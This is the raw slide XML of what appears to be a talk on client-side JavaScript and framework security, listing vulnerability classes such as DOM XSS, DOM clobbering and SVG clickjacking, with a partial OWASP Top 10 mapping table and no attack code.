          <p:cNvPr id="4" name="Title 3"/>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2412998" y="2818671"/>
            <a:ext cx="7586133" cy="1419887"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>JavaScript makes me want to flip the table and say “screw all this”, but I can never be sure what “this” refers to.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15221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447798" y="2633664"/>
            <a:ext cx="8551333" cy="2124604"/>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State of JavaScript today</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common JavaScript vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React vulnerabilities and security-related quirks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Demos</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1100666" y="2163499"/>
            <a:ext cx="10210799" cy="27302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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 3"/>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2412998" y="2818671"/>
            <a:ext cx="7586133" cy="1419887"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>JavaScript makes me want to flip the table and say “screw all this”, but I can never be sure what “this” refers to.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="370515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of the Client-Side JavaScript Field Today</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3"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24277" y="1815868"/>
            <a:ext cx="6106377" cy="3334215"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4540579" y="5436854"/>
            <a:ext cx="4490075" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>https://twitter.com/rbates/status/250620243309907969</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="80134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8566" y="2638349"/>
            <a:ext cx="7089362" cy="1581955"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="8000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4875837" y="4043921"/>
            <a:ext cx="3345766" cy="496493"/>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600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9057250" y="4461343"/>
            <a:ext cx="2029684" cy="273816"/>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accent2"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="519584" y="3873354"/>
            <a:ext cx="3832944" cy="717167"/>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chemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879124" y="4804580"/>
            <a:ext cx="2248487" cy="413518"/>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chemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8534399" y="358050"/>
            <a:ext cx="3786557" cy="604493"/>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chemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2214908" y="6023496"/>
            <a:ext cx="2807258" cy="549782"/>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solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4875837" y="762076"/>
            <a:ext cx="2289098" cy="426115"/>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3"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8265021" y="4855099"/>
            <a:ext cx="3718057" cy="571638"/>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chemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1162426" y="1552162"/>
            <a:ext cx="6016284" cy="1581955"/>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6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="908334" y="3281330"/>
            <a:ext cx="2221269" cy="301075"/>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accent3"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6956475" y="2024270"/>
            <a:ext cx="6016284" cy="1581955"/>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600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9819250" y="1693302"/>
            <a:ext cx="2265655" cy="514405"/>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chemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6323428" y="5511085"/>
            <a:ext cx="5477022" cy="849456"/>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6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10109983" y="3662579"/>
            <a:ext cx="2398542" cy="434562"/>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4"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2663484" y="1390633"/>
            <a:ext cx="2358682" cy="419208"/>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2"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="275489" y="4925111"/>
            <a:ext cx="6491067" cy="923018"/>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7000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879124" y="1201620"/>
            <a:ext cx="3462997" cy="711111"/>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500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="269631" y="489335"/>
            <a:ext cx="3685735" cy="636084"/>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chemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1148330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73867" y="1036984"/>
            <a:ext cx="7436235" cy="4807911"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2546282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43200" y="1096347"/>
            <a:ext cx="7361620" cy="4852269"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4023769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 what about them?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Good</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Faster development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Easier review if you’re familiar with the idioms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Safer applications if/when security controls are built-in</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Bad</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Steep learning curve, especially if you need to learn a new one every couple of months</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If bugs and flaws are built in, your application has built-in problems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Third-party, often lower quality, code for all the things that are not built into the framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fragmented knowledge, poor documentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="292608" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" strike="sngStrike" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Ugly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The Reality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can we choose not to use them? Vanilla JavaScript? No, not really. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="390312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Client-side JavaScript Security Concerns</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1566867"/>
            <a:ext cx="5080000" cy="4848225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-site Scripting, the DOM kind</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Expression Language Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SVG Clickjacking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM Clobbering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client-side Trust Issue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF (partially)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Information Leakage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4008" y="1566867"/>
            <a:ext cx="5346790" cy="3858768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3611475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JavaScript Security Concerns</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414464"/>
            <a:ext cx="11321143" cy="4768622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>What about Node.js and full-stack frameworks?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Server-side security concerns – same as for other languages:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Injection issues</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Path traversal, command injection, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>SQL/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>noSQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSRF (mostly)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Remote code execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>… and the rest of the OWASP</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>These are not in our focus!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400548" y="2307773"/>
            <a:ext cx="4485166" cy="2191431"/>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lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Deserialization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Quite common in JavaScript with the use of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1663054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 Client-Side JavaScript with OWASP Top 10 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1843222131"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1390996" y="2064939"/>
          <a:ext cx="8121972" cy="4079240"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="6245046">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1876926">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>OWASP Top 10</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="ctr"/>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>JavaScript</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Injection (SQL, Command, LDAP)</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Broken Authentication</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Sensitive Data Exposure</a:t>
                      </a:r>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r>
